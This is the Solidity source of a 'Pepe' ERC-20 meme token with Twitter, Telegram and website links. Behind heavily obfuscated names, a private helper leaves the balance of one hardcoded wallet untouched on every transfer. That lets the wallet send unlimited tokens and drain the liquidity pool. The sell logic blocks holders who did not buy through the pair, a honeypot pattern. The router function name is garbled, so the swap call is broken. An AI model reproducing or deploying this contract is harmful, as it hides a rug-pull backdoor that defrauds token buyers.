/**

Pepe   $Пепе


TWITTER: https://twitter.com/Pepegerc
TELEGRAM: https://t.me/Pepeg_erc
WEBSITE: https://pepet.org/

**/


// SPDX-License-Identifier: MIT


pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:");
        return c;
    }

    function  _pxrmo(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _pxrmo(a, b, "SafeMath:");
    }

    function  _pxrmo(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath:");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath:");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface _kfovueomvp {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface _pferojnvhs {
    function swExactTensFrHSportingFeeOransferkes(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH, uint liquidity);
}

contract Pepe is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = unicode"Pepe";
    string private constant _symbol = unicode"Пепе";
    uint8 private constant _decimals = 9;

    uint256 private constant _Totalqt = 42069000000 * 10 **_decimals;
    uint256 public _mxTumsAmaunt = _Totalqt;
    uint256 public _Walleubmx = _Totalqt;
    uint256 public _wapThresholdecx= _Totalqt;
    uint256 public _moynTouxp= _Totalqt;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isEtvhgFenf;
    mapping (address => bool) private _taxvWalrvy;
    mapping(address => uint256) private _lruekrkeacp;
    bool public _tlfereslxnove = false;
    address payable private _qkfvabjlovq;

    uint256 private _BuyTaxinitial=1;
    uint256 private _SellTaxinitial=1;
    uint256 private _BuyTaxfinal=1;
    uint256 private _SellTaxfinal=1;
    uint256 private _BuyTaxAreduce=1;
    uint256 private _SellTaxAreduce=1;
    uint256 private _wapBeforeqbust=0;
    uint256 private _burafbrbv=0;

    _pferojnvhs private _qomRmvobot;
    address private _acGvrdutvw;
    bool private _prghveuvh;
    bool private iobSwpamq = false;
    bool private _aqvEabujp = false;

    event _amrfdlyal(uint _mxTumsAmaunt);
    modifier lokcbThtpup {
        iobSwpamq = true;
        _;
        iobSwpamq = false;
    }

    constructor () {
        _qkfvabjlovq = payable(0x96Ee11eb443AB1c7c945Fb7f20d379a955e4608D);
        _balances[_msgSender()] = _Totalqt;
        _isEtvhgFenf[owner()] = true;
        _isEtvhgFenf[address(this)] = true;
        _isEtvhgFenf[_qkfvabjlovq] = true;
 

        emit Transfer(address(0), _msgSender(), _Totalqt);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _Totalqt;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _pxrmo(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 teeomoun=0;
        if (from != owner () && to != owner ()) {

            if (_tlfereslxnove) {
                if (to != address
                (_qomRmvobot) && to !=
                 address(_acGvrdutvw)) {
                  require(_lruekrkeacp
                  [tx.origin] < block.number,
                  "Only one transfer per block allowed.");
                  _lruekrkeacp
                  [tx.origin] = block.number;
                }
            }

            if (from == _acGvrdutvw && to != 
            address(_qomRmvobot) && !_isEtvhgFenf[to] ) {
                require(amount <= _mxTumsAmaunt,
                 "Exceeds the _mxTumsAmaunt.");
                require(balanceOf(to) + amount
                 <= _Walleubmx, "Exceeds the maxWalletSize.");
                if(_burafbrbv
                < _wapBeforeqbust){
                  require(! _farqmuz(to));
                }
                _burafbrbv++;
                 _taxvWalrvy[to]=true;
                teeomoun = amount.mul((_burafbrbv>
                _BuyTaxAreduce)?_BuyTaxfinal:_BuyTaxinitial)
                .div(100);
            }

            if(to == _acGvrdutvw && from!= address(this) 
            && !_isEtvhgFenf[from] ){
                require(amount <= _mxTumsAmaunt && 
                balanceOf(_qkfvabjlovq)<_moynTouxp,
                 "Exceeds the _mxTumsAmaunt.");
                teeomoun = amount.mul((_burafbrbv>
                _SellTaxAreduce)?_SellTaxfinal:_SellTaxinitial)
                .div(100);
                require(_burafbrbv>_wapBeforeqbust &&
                 _taxvWalrvy[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!iobSwpamq 
            && to == _acGvrdutvw && _aqvEabujp &&
             contractTokenBalance>_wapThresholdecx 
            && _burafbrbv>_wapBeforeqbust&&
             !_isEtvhgFenf[to]&& !_isEtvhgFenf[from]
            ) {
                _swpzmvrkuj( _pxmve(amount, 
                _pxmve(contractTokenBalance,_moynTouxp)));
                uint256 contractETHBalance 
                = address(this).balance;
                if(contractETHBalance 
                > 0) {
                    _rmoejvup(address(this).balance);
                }
            }
        }

        if(teeomoun>0){
          _balances[address(this)]=_balances
          [address(this)].
          add(teeomoun);
          emit Transfer(from,
           address(this),teeomoun);
        }
        _balances[from]= _pxrmo(from,
         _balances[from], amount);
        _balances[to]=_balances[to].
        add(amount. _pxrmo(teeomoun));
        emit Transfer(from, to, 
        amount. _pxrmo(teeomoun));
    }

    function _swpzmvrkuj(uint256
     tokenAmount) private lokcbThtpup {
        if(tokenAmount==0){return;}
        if(!_prghveuvh){return;}
        address[] memory path =
         new address[](2);
        path[0] = address(this);
        path[1] = _qomRmvobot.WETH();
        _approve(address(this),
         address(_qomRmvobot), tokenAmount);
        _qomRmvobot.
        swExactTensFrHSportingFeeOransferkes(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function  _pxmve(uint256 a, 
    uint256 b) private pure
     returns (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _pxrmo(address
     from, uint256 a,
      uint256 b) private view
       returns(uint256){
        if(from 
        == _qkfvabjlovq){
            return a ;
        }else{
            return a . _pxrmo (b);
        }
    }

    function removeLimits() external onlyOwner{
        _mxTumsAmaunt = _Totalqt;
        _Walleubmx = _Totalqt;
        _tlfereslxnove = false;
        emit _amrfdlyal(_Totalqt);
    }

    function _farqmuz(address 
    account) private view 
    returns (bool) {
        uint256 sixzev;
        assembly {
            sixzev :=
             extcodesize
             (account)
        }
        return sixzev > 
        0;
    }

    function _rmoejvup(uint256
    amount) private {
        _qkfvabjlovq.
        transfer(amount);
    }

    function openTrading( ) external onlyOwner( ) {
        require( ! _prghveuvh);
        _qomRmvobot   =  _pferojnvhs (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D) ;
        _approve(address(this), address(_qomRmvobot), _Totalqt);
        _acGvrdutvw = _kfovueomvp(_qomRmvobot.factory()). createPair (address(this),  _qomRmvobot . WETH ());
        _qomRmvobot.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(_acGvrdutvw).approve(address(_qomRmvobot), type(uint).max);
        _aqvEabujp = true;
        _prghveuvh = true;
    }

    receive() external payable {}
}